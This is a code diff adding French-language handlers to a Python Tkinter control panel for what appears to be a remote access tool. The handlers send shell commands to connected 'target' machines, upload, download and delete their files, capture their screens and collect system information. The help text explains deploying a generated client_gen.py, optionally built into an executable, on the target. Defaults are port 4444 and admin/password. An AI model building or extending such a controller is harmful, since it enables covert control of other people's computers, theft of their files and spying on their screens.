-    # Placeholder method stubs for other functionality
-    def refresh_clients(self): pass
-    def connect_to_client(self): pass
-    def disconnect_client(self): pass
-    def send_command(self, event=None): pass
-    def browse_local_dir(self): pass
-    def refresh_local_files(self): pass
-    def list_remote_files(self): pass
-    def upload_file(self): pass
-    def download_file(self): pass
-    def delete_remote_file(self): pass
-    def capture_screenshot(self): pass
-    def save_screenshot(self): pass
-    def prev_screenshot(self): pass
-    def next_screenshot(self): pass
-    def get_system_info(self): pass
-    def export_system_info(self): pass
-    def save_settings(self): pass
-    def reset_settings(self): pass
+    def refresh_clients(self):
+        """Actualise la liste des clients connectés."""
+        self.client_listbox.delete(0, tk.END)
+        if not clients:
+            self.client_listbox.insert(tk.END, "  (aucun client connecté)")
+            self.client_listbox.itemconfig(0, fg=self.muted_color)
+        else:
+            for cid, client in clients.items():
+                info = client.get("info", "Inconnu")
+                addr = client.get("address", ("?", "?"))
+                # Parser les infos système
+                hostname = "Inconnu"
+                os_name  = "Inconnu"
+                for part in info.split("|"):
+                    if "Node:" in part:
+                        hostname = part.split(":", 1)[1].strip()
+                    if "System:" in part:
+                        os_name = part.split(":", 1)[1].strip()
+                label = f"  [{cid}] {addr[0]} — {hostname} ({os_name})"
+                self.client_listbox.insert(tk.END, label)
+        self.update_status_indicator("listening" if self.server else "idle")
+
+    def connect_to_client(self):
+        """Sélectionne le client choisi dans la liste pour envoi de commandes."""
+        global current_client
+        selection = self.client_listbox.curselection()
+        if not selection:
+            messagebox.showwarning(
+                "Aucun client sélectionné",
+                "⚠️ Aucun client n'est sélectionné.\n\n"
+                "Comment procéder :\n"
+                "  1. Assurez-vous que le serveur est démarré.\n"
+                "  2. Exécutez client_gen.py sur la machine cible.\n"
+                "  3. Cliquez sur '🔄 Actualiser' pour voir le client.\n"
+                "  4. Cliquez sur le client dans la liste, puis sur '▶ Connecter'."
+            )
+            return
+
+        if not clients:
+            messagebox.showerror(
+                "Aucun client disponible",
+                "❌ Aucun client n'est actuellement connecté au serveur.\n\n"
+                "Vérifiez que :\n"
+                "  • Le serveur est bien démarré.\n"
+                "  • Le client utilise la bonne IP et le bon port.\n"
+                "  • Le pare-feu autorise le port configuré."
+            )
+            return
+
+        idx = selection[0]
+        client_keys = list(clients.keys())
+        if idx < len(client_keys):
+            cid = client_keys[idx]
+            current_client = clients[cid]
+            self.log_message(
+                f"Connexion établie avec le client [{cid}] : "
+                f"{current_client['address'][0]}.",
+                "success"
+            )
+        else:
+            self.log_message(
+                "Impossible de sélectionner ce client — la liste est désynchronisée. "
+                "Cliquez sur '🔄 Actualiser' et réessayez.",
+                "error"
+            )
+
+    def disconnect_client(self):
+        """Déconnecte le client actif."""
+        global current_client
+        if not current_client:
+            messagebox.showwarning(
+                "Aucun client actif",
+                "⚠️ Aucun client n'est actuellement actif.\n\n"
+                "Sélectionnez d'abord un client dans la liste, puis cliquez sur '▶ Connecter'."
+            )
+            return
+        try:
+            addr = current_client.get("address", ("?", "?"))
+            current_client["socket"].close()
+            # Retirer de la liste globale
+            for cid, c in list(clients.items()):
+                if c is current_client:
+                    del clients[cid]
+                    break
+            current_client = None
+            self.log_message(f"Client {addr[0]} déconnecté.", "warning")
+            self.refresh_clients()
+        except Exception as e:
+            self.log_message(
+                f"Erreur lors de la déconnexion : {e}\n"
+                "Le client est peut-être déjà déconnecté.",
+                "error"
+            )
+            current_client = None
+
+    def send_command(self, event=None):
+        """Envoie une commande au client actif."""
+        cmd = self.cmd_entry.get().strip()
+        if not cmd:
+            return  # Ignorer les commandes vides
+
+        if not current_client:
+            self.log_message(
+                "Aucun client connecté — impossible d'envoyer la commande.\n"
+                "  → Sélectionnez un client dans la liste puis cliquez sur '▶ Connecter'.",
+                "error"
+            )
+            return
+
+        try:
+            self.log_message(f"Commande envoyée : {cmd}", "info")
+            self.secure_send(current_client["socket"], cmd)
+            self.cmd_entry.delete(0, tk.END)
+        except BrokenPipeError:
+            self.log_message(
+                "Connexion perdue avec le client (BrokenPipe).\n"
+                "  → Le client s'est probablement déconnecté.\n"
+                "  → Cliquez sur '🔄 Actualiser' pour mettre à jour la liste.",
+                "error"
+            )
+        except OSError as e:
+            self.log_message(
+                f"Erreur réseau lors de l'envoi : {e}\n"
+                "  → Vérifiez que le client est toujours connecté.",
+                "error"
+            )
+        except Exception as e:
+            self.log_message(f"Erreur inattendue lors de l'envoi : {e}", "error")
+
+    def browse_local_dir(self):
+        """Ouvre un dialogue pour naviguer dans les répertoires locaux."""
+        directory = filedialog.askdirectory(initialdir=self.local_path_var.get())
+        if directory:
+            self.local_path_var.set(directory)
+            self.refresh_local_files()
+
+    def refresh_local_files(self):
+        """Actualise la liste des fichiers locaux."""
+        path = self.local_path_var.get()
+        self.local_file_listbox.delete(0, tk.END)
+        try:
+            entries = os.listdir(path)
+            if not entries:
+                self.local_file_listbox.insert(tk.END, "  (dossier vide)")
+            else:
+                for entry in sorted(entries):
+                    full_path = os.path.join(path, entry)
+                    prefix = "📂 " if os.path.isdir(full_path) else "📄 "
+                    self.local_file_listbox.insert(tk.END, f"{prefix}{entry}")
+        except PermissionError:
+            self.local_file_listbox.insert(tk.END, "  ❌ Accès refusé à ce dossier.")
+            self.file_status_var.set(
+                "Accès refusé. Choisissez un dossier auquel vous avez accès."
+            )
+        except FileNotFoundError:
+            self.local_file_listbox.insert(tk.END, "  ❌ Dossier introuvable.")
+            self.file_status_var.set(
+                f"Le chemin '{path}' n'existe pas. Vérifiez le chemin saisi."
+            )
+        except Exception as e:
+            self.log_message(f"Erreur lors de la lecture du dossier : {e}", "error")
+
+    def list_remote_files(self):
+        """Demande la liste des fichiers distants au client."""
+        if not current_client:
+            messagebox.showwarning(
+                "Aucun client connecté",
+                "⚠️ Aucun client actif.\n\n"
+                "Sélectionnez un client dans le Panneau de contrôle, "
+                "puis cliquez sur '▶ Connecter'."
+            )
+            return
+        path = self.remote_path_var.get() or "."
+        cmd = f"shell dir {path}" if platform.system() == "Windows" else f"shell ls -la {path}"
+        self.log_message(f"Liste distante demandée pour : {path}", "info")
+        self.secure_send(current_client["socket"], cmd)
+
+    def upload_file(self):
+        """Téléverse un fichier local vers le client."""
+        if not current_client:
+            messagebox.showwarning(
+                "Aucun client connecté",
+                "⚠️ Impossible d'uploader : aucun client actif.\n\n"
+                "Connectez-vous d'abord à un client dans le Panneau de contrôle."
+            )
+            return
+        sel = self.local_file_listbox.curselection()
+        if not sel:
+            messagebox.showinfo(
+                "Sélection requise",
+                "ℹ️ Sélectionnez d'abord un fichier dans la liste des fichiers locaux (à gauche).\n"
+                "Les dossiers ne peuvent pas être uploadés directement."
+            )
+            return
+        filename = self.local_file_listbox.get(sel[0]).lstrip("📂 📄 ")
+        local_path = os.path.join(self.local_path_var.get(), filename)
+        if not os.path.isfile(local_path):
+            messagebox.showerror(
+                "Fichier invalide",
+                f"❌ '{filename}' est un dossier, pas un fichier.\n"
+                "Seuls les fichiers peuvent être transférés."
+            )
+            return
+        self.log_message(f"Upload en cours : {local_path}", "info")
+        self.secure_send(current_client["socket"], f"upload {local_path}")
+        self.file_status_var.set(f"Upload : {filename} — en attente de confirmation...")
+
+    def download_file(self):
+        """Télécharge un fichier depuis le client."""
+        if not current_client:
+            messagebox.showwarning(
+                "Aucun client connecté",
+                "⚠️ Impossible de télécharger : aucun client actif.\n\n"
+                "Connectez-vous d'abord à un client dans le Panneau de contrôle."
+            )
+            return
+        sel = self.remote_file_listbox.curselection()
+        if not sel:
+            messagebox.showinfo(
+                "Sélection requise",
+                "ℹ️ Sélectionnez d'abord un fichier dans la liste des fichiers distants (à droite).\n"
+                "Cliquez sur 'List' pour afficher les fichiers disponibles."
+            )
+            return
+        filename = self.remote_file_listbox.get(sel[0]).strip()
+        remote_path = os.path.join(self.remote_path_var.get(), filename)
+        self.log_message(f"Téléchargement demandé : {remote_path}", "info")
+        self.secure_send(current_client["socket"], f"download {remote_path}")
+        self.file_status_var.set(f"Téléchargement : {filename} — en cours...")
+
+    def delete_remote_file(self):
+        """Supprime un fichier sur le client distant."""
+        if not current_client:
+            messagebox.showwarning(
+                "Aucun client connecté",
+                "⚠️ Impossible de supprimer : aucun client actif."
+            )
+            return
+        sel = self.remote_file_listbox.curselection()
+        if not sel:
+            messagebox.showinfo(
+                "Sélection requise",
+                "ℹ️ Sélectionnez un fichier dans la liste distante avant de supprimer."
+            )
+            return
+        filename = self.remote_file_listbox.get(sel[0]).strip()
+        confirm = messagebox.askyesno(
+            "Confirmer la suppression",
+            f"⚠️ Êtes-vous certain de vouloir supprimer '{filename}' sur le client distant ?\n\n"
+            "Cette action est irréversible."
+        )
+        if confirm:
+            delete_cmd = (
+                f"shell del /f \"{filename}\"" if platform.system() == "Windows"
+                else f"shell rm -f '{filename}'"
+            )
+            self.secure_send(current_client["socket"], delete_cmd)
+            self.log_message(f"Suppression demandée : {filename}", "warning")
+
+    def capture_screenshot(self):
+        """Demande une capture d'écran au client."""
+        if not current_client:
+            messagebox.showwarning(
+                "Aucun client connecté",
+                "⚠️ Impossible de capturer l'écran : aucun client actif.\n\n"
+                "Comment procéder :\n"
+                "  1. Démarrez le serveur (▶ Démarrer le serveur).\n"
+                "  2. Exécutez client_gen.py sur la machine cible.\n"
+                "  3. Sélectionnez le client dans le Panneau de contrôle.\n"
+                "  4. Revenez ici et cliquez sur 'Capturer'."
+            )
+            return
+        self.log_message("Capture d'écran demandée...", "info")
+        self.screenshot_status_var.set("⏳ Capture en cours...")
+        self.secure_send(current_client["socket"], "screenshot")
+
+    def save_screenshot(self):
+        """Sauvegarde la capture d'écran actuelle sur disque."""
+        if not self.screenshots or self.current_screenshot_index >= len(self.screenshots):
+            messagebox.showinfo(
+                "Aucune capture disponible",
+                "ℹ️ Aucune capture d'écran à sauvegarder.\n"
+                "Cliquez d'abord sur 'Capturer' pour prendre une capture."
+            )
+            return
+        save_path = filedialog.asksaveasfilename(
+            defaultextension=".png",
+            filetypes=[("PNG Files", "*.png"), ("All Files", "*.*")]
+        )
+        if save_path:
+            try:
+                self.screenshots[self.current_screenshot_index].save(save_path)
+                self.log_message(f"Capture sauvegardée : {save_path}", "success")
+            except Exception as e:
+                self.log_message(
+                    f"Erreur lors de la sauvegarde : {e}\n"
+                    f"Vérifiez que vous avez les permissions d'écriture dans ce dossier.",
+                    "error"
+                )
+
+    def prev_screenshot(self):
+        """Navigue vers la capture d'écran précédente."""
+        if not self.screenshots:
+            return
+        self.current_screenshot_index = (self.current_screenshot_index - 1) % len(self.screenshots)
+        self.display_screenshot()
+
+    def next_screenshot(self):
+        """Navigue vers la capture d'écran suivante."""
+        if not self.screenshots:
+            return
+        self.current_screenshot_index = (self.current_screenshot_index + 1) % len(self.screenshots)
+        self.display_screenshot()
+
+    def display_screenshot(self):
+        """Affiche la capture d'écran actuelle dans le canvas."""
+        if not self.screenshots or self.current_screenshot_index >= len(self.screenshots):
+            return
+        if not PIL_AVAILABLE:
+            self.log_message(
+                "PIL/Pillow est requis pour afficher les captures.\n"
+                "Installez-le avec : pip install pillow",
+                "error"
+            )
+            return
+        image = self.screenshots[self.current_screenshot_index]
+        canvas_width  = self.screenshot_canvas.winfo_width()
+        canvas_height = self.screenshot_canvas.winfo_height()
+        if canvas_width > 50 and canvas_height > 50:
+            img_w, img_h = image.size
+            scale = min(canvas_width / img_w, canvas_height / img_h)
+            new_w, new_h = int(img_w * scale), int(img_h * scale)
+            resized = image.resize((new_w, new_h), Image.LANCZOS)
+            photo = ImageTk.PhotoImage(resized)
+            self.screenshot_image = photo
+            self.screenshot_canvas.delete("all")
+            self.screenshot_canvas.create_image(
+                canvas_width // 2, canvas_height // 2,
+                image=photo, anchor="center"
+            )
+            self.screenshot_label.config(
+                text=f"Capture {self.current_screenshot_index + 1} / {len(self.screenshots)}"
+            )
+
+    def get_system_info(self):
+        """Demande les informations système au client actif."""
+        if not current_client:
+            messagebox.showwarning(
+                "Aucun client connecté",
+                "⚠️ Impossible de récupérer les infos système : aucun client actif.\n\n"
+                "Sélectionnez un client dans le Panneau de contrôle."
+            )
+            return
+        self.log_message("Récupération des informations système...", "info")
+        self.sysinfo_status_var.set("⏳ Récupération en cours...")
+        self.secure_send(current_client["socket"], "sysinfo")
+
+    def export_system_info(self):
+        """Exporte les informations système dans un fichier texte."""
+        # Tente de récupérer le contenu affiché dans les zones système
+        content = ""
+        for widget in [self.system_info_text, self.network_info_text, self.hardware_info_text]:
+            text = widget.get("1.0", tk.END).strip()
+            if text:
+                content += text + "\n\n"
+
+        if not content.strip():
+            messagebox.showinfo(
+                "Aucune donnée à exporter",
+                "ℹ️ Aucune information système disponible.\n"
+                "Cliquez d'abord sur 'Actualiser les infos' pour récupérer les données."
+            )
+            return
+
+        save_path = filedialog.asksaveasfilename(
+            defaultextension=".txt",
+            filetypes=[("Fichiers texte", "*.txt"), ("Tous les fichiers", "*.*")]
+        )
+        if save_path:
+            try:
+                with open(save_path, "w", encoding="utf-8") as f:
+                    f.write(f"# Rapport système — {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
+                    f.write(content)
+                self.log_message(f"Infos système exportées : {save_path}", "success")
+            except PermissionError:
+                messagebox.showerror(
+                    "Erreur de permission",
+                    f"❌ Impossible d'écrire dans '{save_path}'.\n"
+                    "Choisissez un emplacement où vous avez les droits d'écriture."
+                )
+            except Exception as e:
+                self.log_message(f"Erreur lors de l'export : {e}", "error")
+
+    def save_settings(self):
+        """Sauvegarde les paramètres dans un fichier JSON."""
+        settings = {
+            "server_host":     self.server_host.get(),
+            "server_port":     self.server_port.get(),
+            "auth_username":   self.auth_username_var.get(),
+            "auth_password":   self.auth_password_var.get(),
+            "auto_generate":   self.auto_generate_var.get(),
+            "lan_mode":        self.lan_mode_var.get(),
+            "build_exe":       self.build_exe_var.get(),
+            "save_to_builds":  self.save_to_builds_var.get(),
+            "auto_refresh":    self.auto_refresh_var.get(),
+            "log_level":       self.log_level_var.get(),
+        }
+        try:
+            # Valider le port avant de sauvegarder
+            port = settings["server_port"]
+            if not (1 <= port <= 65535):
+                raise ValueError(f"Port invalide : {port}. Doit être entre 1 et 65535.")
+
+            settings_path = "server_settings.json"
+            with open(settings_path, "w", encoding="utf-8") as f:
+                json.dump(settings, f, indent=2)
+            self.log_message(f"Paramètres sauvegardés dans '{settings_path}'.", "success")
+            messagebox.showinfo("Sauvegarde réussie",
+                                f"✅ Paramètres sauvegardés dans '{settings_path}'.")
+        except ValueError as e:
+            messagebox.showerror(
+                "Valeur invalide",
+                f"❌ {e}\nCorrigez la valeur et réessayez."
+            )
+        except PermissionError:
+            messagebox.showerror(
+                "Erreur de permission",
+                "❌ Impossible de sauvegarder les paramètres.\n"
+                "Vérifiez que vous avez les droits d'écriture dans ce dossier."
+            )
+        except Exception as e:
+            self.log_message(f"Erreur lors de la sauvegarde des paramètres : {e}", "error")
+
+    def reset_settings(self):
+        """Remet les paramètres par défaut."""
+        confirm = messagebox.askyesno(
+            "Réinitialiser les paramètres",
+            "⚠️ Voulez-vous vraiment réinitialiser tous les paramètres aux valeurs par défaut ?\n"
+            "Cette action est irréversible."
+        )
+        if confirm:
+            self.server_host.set("0.0.0.0")
+            self.server_port.set(4444)
+            self.auth_username_var.set("admin")
+            self.auth_password_var.set("password")
+            self.auto_generate_var.set(True)
+            self.lan_mode_var.set(True)
+            self.build_exe_var.set(False)
+            self.save_to_builds_var.set(True)
+            self.auto_refresh_var.set(True)
+            self.log_level_var.set("Info")
+            self.log_message("Paramètres réinitialisés aux valeurs par défaut.", "warning")
 
     def get_local_ip(self):
         """Get the local IP address of the machine based on settings"""
@@ -1545,14 +2151,24 @@ def test_connection(host, port):
                 
                 return True
             else:
-                self.log_message(f"Error building executable: {result.stderr}", "error")
-                # Add more detailed error information
+                self.log_message(
+                    f"Erreur de construction de l'exécutable : {result.stderr}",
+                    "error"
+                )
                 if "ImportError" in result.stderr:
-                    self.log_message("Try installing PyInstaller manually: pip install pyinstaller", "warning")
+                    self.log_message(
+                        "Indice : une dépendance est manquante dans PyInstaller.\n"
+                        "Essayez d'installer manuellement : pip install pyinstaller",
+                        "warning"
+                    )
                 return False
                 
         except Exception as e:
-            self.log_message(f"Error building executable: {str(e)}", "error")
+            self.log_message(
+                f"Erreur lors de la construction de l'exécutable : {e}\n"
+                "Vérifiez que PyInstaller est installé : pip install pyinstaller",
+                "error"
+            )
             return False
     
     def manual_generate_client(self):
@@ -1563,14 +2179,28 @@ def test_connection(host, port):
         
         if self.generate_client_script(ip, port):
             self.client_generated = True
-            messagebox.showinfo("Success", f"client_gen.py generated successfully with IP: {ip}, Port: {port}")
-            
-            # Build executable if option is selected
+            messagebox.showinfo(
+                "Fichier client généré",
+                f"✅ client_gen.py généré avec succès !\n\n"
+                f"  IP du serveur : {ip}\n"
+                f"  Port : {port}\n\n"
+                "Prochaine étape :\n"
+                "  Copiez client_gen.py sur la machine cible\n"
+                "  et exécutez-le avec : python client_gen.py"
+            )
             if self.build_exe_var.get():
                 if self.build_client_executable():
-                    pass  # Success message already shown in build_client_executable
+                    pass  # Message déjà affiché dans build_client_executable
         else:
-            messagebox.showerror("Error", "Failed to generate client. Check the logs.")
+            messagebox.showerror(
+                "Erreur de génération",
+                "❌ Échec de la génération du client.\n\n"
+                "Causes possibles :\n"
+                "  • Le fichier client_template.py est introuvable.\n"
+                "  • Vous n'avez pas les droits d'écriture dans ce dossier.\n"
+                "  • Une erreur de syntaxe dans le template.\n\n"
+                "Consultez la console pour plus de détails."
+            )
     
     def show_ip_info(self):
         """Display all detected IP addresses"""
@@ -1592,22 +2222,54 @@ def test_connection(host, port):
         messagebox.showinfo("IP Information", ip_message)
     
     def test_port(self):
-        """Test if the specified port is available"""
-        port = self.server_port.get()
-        
+        """Teste si le port spécifié est disponible."""
         try:
-            # Try to create a socket and bind to the port
+            port = self.server_port.get()
+            if not (1 <= port <= 65535):
+                messagebox.showerror(
+                    "Port invalide",
+                    f"❌ Le numéro de port '{port}' est hors de la plage valide.\n"
+                    "Un port doit être un entier entre 1 et 65535.\n"
+                    "Valeur recommandée : 4444."
+                )
+                return
+        except tk.TclError:
+            messagebox.showerror(
+                "Port invalide",
+                "❌ La valeur du port n'est pas un nombre valide.\n"
+                "Entrez un entier entre 1 et 65535."
+            )
+            return
+
+        try:
             test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             test_socket.settimeout(1)
             test_socket.bind(('0.0.0.0', port))
             test_socket.listen(1)
             test_socket.close()
-            messagebox.showinfo("Port Test", f"Port {port} is available and not blocked.")
+            messagebox.showinfo(
+                "Port disponible ✅",
+                f"✅ Le port {port} est disponible et non bloqué.\n"
+                "Vous pouvez démarrer le serveur."
+            )
         except socket.error as e:
-            if e.errno == 10048:  # Address already in use
-                messagebox.showerror("Port Test", f"Port {port} is already in use by another application.")
+            if e.errno == 10048 or e.errno == 98:  # Address already in use
+                messagebox.showerror(
+                    "Port déjà utilisé ❌",
+                    f"❌ Le port {port} est déjà utilisé par une autre application.\n\n"
+                    "Solutions :\n"
+                    f"  • Arrêtez l'application qui utilise le port {port}.\n"
+                    "  • Choisissez un autre port (exécution :\n"
+                    "     - 5555, 8888, 9999 sont souvent libres).\n"
+                    "  • Vérifiez via la commande : netstat -ano | findstr {port}"
+                )
             else:
-                messagebox.showerror("Port Test", f"Port {port} test failed: {str(e)}")
+                messagebox.showerror(
+                    "Test de port échoué ❌",
+                    f"❌ Échec du test sur le port {port}.\n"
+                    f"Détail de l'erreur : {str(e)}\n\n"
+                    "Vérifiez vos permissions réseau (certains ports < 1024 nécessitent les droits admin)."
+                )
 
 # Main function to start the application
 if __name__ == "__main__":
